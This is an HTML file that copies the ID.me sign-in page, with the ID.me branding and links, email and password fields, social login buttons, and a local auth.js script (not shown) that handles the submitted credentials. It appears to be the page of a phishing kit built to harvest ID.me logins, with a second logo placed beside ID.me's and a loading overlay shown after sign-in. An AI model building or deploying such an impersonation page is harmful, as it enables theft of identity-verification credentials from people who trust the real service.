<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link rel="stylesheet" href="./css/auth.css">
    <link rel="icon" type="image/png" sizes="32x32" href="../img/icon.ico">
    <script src="https://kit.fontawesome.com/bcfb457481.js" crossorigin="anonymous"></script>
    <title>Sign in to ID.me - ID.me</title>
</head>
<body>
    <header>
        <div class="logo">
            <img src="../img/idme.svg">
            <h2>+</h2>
            <img src="../img/logo.svg">
        </div>
    </header>
    <div class="container">
        <h1>Sign in to ID.me</h1>
        <div class="info">
            <h3>New to ID.me?</h3>
            <h3><a href="https://api.id.me/en/registration/new">Create an ID.me account</a></h3>
        </div>
        <div class="message">Please fill out the required fields</div>
        <div class="tab">
            <label for="Email">Email</label>
            <input type="email" pattern="/^\S+@\S+\.\S+$/" id="email" name="email" placeholder="Enter your email address">
        </div>
        <div class="tab">
            <label for="Password">Password</label>
            <div class="passinput">
                <input type="text" class="password" id="password" name="password" placeholder="Enter password">
                <i class="toggle fa-solid fa-eye-slash fa-xl"></i>
            </div>
        </div>
        <div class="checkbox">
            <input type="checkbox" id="check">
            <label for="check">
                <h3>Remember me</h3>
                <h4>For your security, select only on your devices.</h4>
            </label>
        </div>
        <button class="btn" id="sign-in">Sign in</button>
        <a class="forgps" href="https://api.id.me/en/passwords/new">Forgot password</a>
        <div class="or">
            <h2>OR</h2>
        </div>
        <div class="socials">
            <div class="social">
                <a href="https://www.facebook.com" target="_blank"></a>
            </div>
            <div class="social">
                <a href="https://accounts.google.com/InteractiveLogin/signinchooser?continue=https%3A%2F%2Fwww.google.com%2F%3Fptid%3D19027681%26ptt%3D8%26fpts%3D0&ec=futura_hpp_co_si_001_p&ifkv=Ab5oB3o0CWdVg_JCwKr9EgFdoOpDLlh5YHmo972WML7QGz56VWPOR1BYhOf_w7f004Yf4jVNgZZ5zA&ddm=0&flowName=GlifWebSignIn&flowEntry=ServiceLogin" target="_blank"></a>
            </div>
            <div class="social">
                <a href="https://secure5.store.apple.com/shop/signIn/account?ssi=1AAABkWzhK0Qgj4DUX8y2XoGYggHr0PwUs9pwNF7AwoZywa1ePj11Ul0AAAAzaHR0cHM6Ly9zZWN1cmU1LnN0b3JlLmFwcGxlLmNvbS9zaG9wL2FjY291bnQvaG9tZXx8AAIB2obSb-BQ9AWoe7X8AZgD5OYahYbzL7hQFeGHGbRgHe0" target="_blank"></a>
            </div>
            <div class="social">
                <a href="https://www.linkedin.com/login?fromSignIn=true&trk=guest_homepage-basic_nav-header-signin" target="_blank"></a>
            </div>
        </div>
        <button class="btn view">View more options</button>
    </div>
    <footer>
        <div class="language"><a href="">English</a></div>
        <div class="link">
                <div class="item"><a href="https://www.id.me/about?_ga=2.219718233.1547762766.1724082407-1041958704.1723783058">What is ID.me?</a></div>
                <div class="item">|</div>
                <div class="item"><a href="https://www.id.me/terms?_ga=2.10594804.1547762766.1724082407-1041958704.1723783058">Terms of Service</a></div>
                <div class="item">|</div>
                <div class="item"><a href="https://www.id.me/privacy?_ga=2.248761927.1547762766.1724082407-1041958704.1723783058">Privacy Policy</a></div>
        </div>
    </footer>
    <div id="wait">Loading...</div>
    <script src="./js/auth.js"></script>
</body>
</html>
